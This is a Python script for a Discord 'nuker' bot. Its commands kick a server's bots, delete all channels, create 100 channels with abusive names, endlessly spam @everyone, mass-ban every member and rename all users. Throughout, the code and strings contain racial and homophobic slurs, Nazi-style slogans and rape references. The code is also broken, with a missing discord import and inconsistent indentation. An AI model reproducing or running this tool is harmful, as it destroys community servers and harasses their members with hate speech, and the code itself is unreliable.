import random
import aiohttp
from discord.ext import commands
import asyncio

names = [
    "raped by artemis",
    "buttfucked",
    "kys faggot",
    "bumraped by artemis",
    "heil artemis",
    "oh emm gee",
    "pee ohh ess"
]

token = "your retarded token"

phobia = commands.Bot(command_prefix="+", intents=discord.Intents.all())

@phobia.event
async def on_ready():
  print("PoS Nuker v2 | Made by Artemis. Prefix = + | To nuke say +fun ")                                                                           
  await phobia.change_presence(activity=discord.Game(name="Phobia of Silence | Artemis"))

@phobia.command()
async def fun(ctx):
  guild = ctx.guild
  for member in ctx.guild.members:
        if member.bot:
            try:
                await member.kick(reason="Bots being kicked.")
                print(f"Kicked bot: {member}")
            except:
                print(f"Failed to kick bot: {member}")
    await ctx.guild.edit(name="Raped by PoS", icon=None)
    for channels in ctx.guild.channels:
        try:
            await asyncio.gather(*[channel.delete() for channel in ctx.guild.channels])
            print("deleted {}".format(channels))
        except:
            print("failure {}".format(channels))

    await asyncio.gather(*[ctx.guild.create_text_channel(random.choice(names))  for _ in range(100)])

@phobia.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send("@everyone heil artemis, you have been NIGGERED.")
    await asyncio.sleep(0.2)

@phobia.command()
 async def massban(ctx):
  asyncio.gather(*[await members.ban(reason="Phobia On Top") for members in ctx.guild.members])

@phobia.command()
async def rename(ctx):
  asyncio.gather(*[await members.edit(nick="faggot") for members in ctx.guild.members])

try:
  phobia.run(token)
except:
  for _ in range(100000):
    print("invalid token retard kys")